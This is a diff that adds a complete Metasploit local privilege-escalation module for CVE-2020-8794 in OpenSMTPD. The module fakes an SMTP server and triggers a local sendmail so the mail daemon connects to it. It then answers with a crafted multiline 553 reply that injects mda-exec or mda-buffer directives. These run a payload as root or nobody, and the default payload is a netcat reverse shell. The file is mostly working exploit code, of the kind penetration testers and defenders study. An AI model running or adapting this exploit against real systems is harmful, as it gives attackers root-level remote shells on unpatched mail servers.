@@ -1,0 +1,180 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+
+  # smtpd(8) may crash on a malformed message
+  Rank = AverageRanking
+
+  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::Expect
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'OpenSMTPD OOB Read Local Privilege Escalation',
+      'Description'    => %q{
+        This module exploits an out-of-bounds read of an attacker-controlled
+        string in OpenSMTPD's MTA implementation to execute a command as the
+        root or nobody user, depending on the kind of grammar OpenSMTPD uses.
+      },
+      'Author'         => [
+        'Qualys', # Discovery and PoC
+        'wvu'     # Module
+      ],
+      'References'     => [
+        ['CVE', '2020-8794'],
+        ['URL', 'https://seclists.org/oss-sec/2020/q1/96']
+      ],
+      'DisclosureDate' => '2020-02-24',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => true, # NOTE: Only when exploiting new grammar
+      # Patched in 6.6.4: https://www.opensmtpd.org/security.html
+      # New grammar introduced in 6.4.0: https://github.com/openbsd/src/commit/e396a728fd79383b972631720cddc8e987806546
+      'Targets'        => [
+        ['OpenSMTPD < 6.6.4 (automatic grammar selection)',
+          patched_version:     Gem::Version.new('6.6.4'),
+          new_grammar_version: Gem::Version.new('6.4.0')
+        ]
+      ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {
+        'SRVPORT'      => 25,
+        'PAYLOAD'      => 'cmd/unix/reverse_netcat',
+        'WfsDelay'     => 60 # May take a little while for mail to process
+      },
+      'Notes'          => {
+        'Stability'    => [CRASH_SERVICE_DOWN],
+        'Reliability'  => [REPEATABLE_SESSION],
+        'SideEffects'  => [IOC_IN_LOGS]
+      }
+    ))
+
+    register_advanced_options([
+      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])
+    ])
+
+    # HACK: We need to run check in order to determine a grammar to use
+    options.remove_option('AutoCheck')
+  end
+
+  def srvhost_addr
+    Rex::Socket.source_address(session.session_host)
+  end
+
+  def rcpt_to
+    "#{rand_text_alpha_lower(8..42)}@[#{srvhost_addr}]"
+  end
+
+  def check
+    smtpd_help = cmd_exec('smtpd -h')
+
+    if smtpd_help.empty?
+      return CheckCode::Unknown('smtpd(8) help could not be displayed')
+    end
+
+    version = smtpd_help.scan(/^version: OpenSMTPD ([\d.p]+)$/).flatten.first
+
+    unless version
+      return CheckCode::Unknown('OpenSMTPD version could not be found')
+    end
+
+    version = Gem::Version.new(version)
+
+    if version < target[:patched_version]
+      if version >= target[:new_grammar_version]
+        vprint_status("OpenSMTPD #{version} is using new grammar")
+        @grammar = :new
+      else
+        vprint_status("OpenSMTPD #{version} is using old grammar")
+        @grammar = :old
+      end
+
+      return CheckCode::Appears(
+        "OpenSMTPD #{version} appears vulnerable to CVE-2020-8794"
+      )
+    end
+
+    CheckCode::Safe("OpenSMTPD #{version} is NOT vulnerable to CVE-2020-8794")
+  end
+
+  def exploit
+    # NOTE: Automatic check is implemented by the AutoCheck mixin
+    super
+
+    start_service
+
+    sendmail = "/usr/sbin/sendmail '#{rcpt_to}' < /dev/null && echo true"
+
+    print_status("Executing local sendmail(8) command: #{sendmail}")
+    if cmd_exec(sendmail) != 'true'
+      fail_with(Failure::Unknown, 'Could not send mail. Is OpenSMTPD running?')
+    end
+  end
+
+  def on_client_connect(client)
+    print_status("Client #{client.peerhost}:#{client.peerport} connected")
+
+    # Brilliant work, Qualys!
+    case @grammar
+    when :new
+      print_status('Exploiting new OpenSMTPD grammar for a root shell')
+
+      yeet = <<~EOF
+        553-
+        553
+
+        dispatcher: local_mail
+        type: mda
+        mda-user: root
+        mda-exec: #{payload.encoded}; exit 0\x00
+      EOF
+    when :old
+      print_status('Exploiting old OpenSMTPD grammar for a nobody shell')
+
+      yeet = <<~EOF
+        553-
+        553
+
+        type: mda
+        mda-method: mda
+        mda-usertable: <getpwnam>
+        mda-user: nobody
+        mda-buffer: #{payload.encoded}; exit 0\x00
+      EOF
+    else
+      fail_with(Failure::BadConfig, 'Could not determine OpenSMTPD grammar')
+    end
+
+    sploit = {
+      '220' => /EHLO /,
+      '250' => /MAIL FROM:<[^>]/,
+      yeet  => nil
+    }
+
+    print_status('Faking SMTP server and sending exploit')
+    sploit.each do |line, pattern|
+      send_expect(
+        line,
+        pattern,
+        sock:    client,
+        newline: "\r\n",
+        timeout: datastore['ExpectTimeout']
+      )
+    end
+  rescue Timeout::Error => e
+    fail_with(Failure::TimeoutExpired, e.message)
+  ensure
+    print_status("Disconnecting client #{client.peerhost}:#{client.peerport}")
+    client.close
+  end
+
+  def on_client_close(client)
+    print_status("Client #{client.peerhost}:#{client.peerport} disconnected")
+  end
+
+end
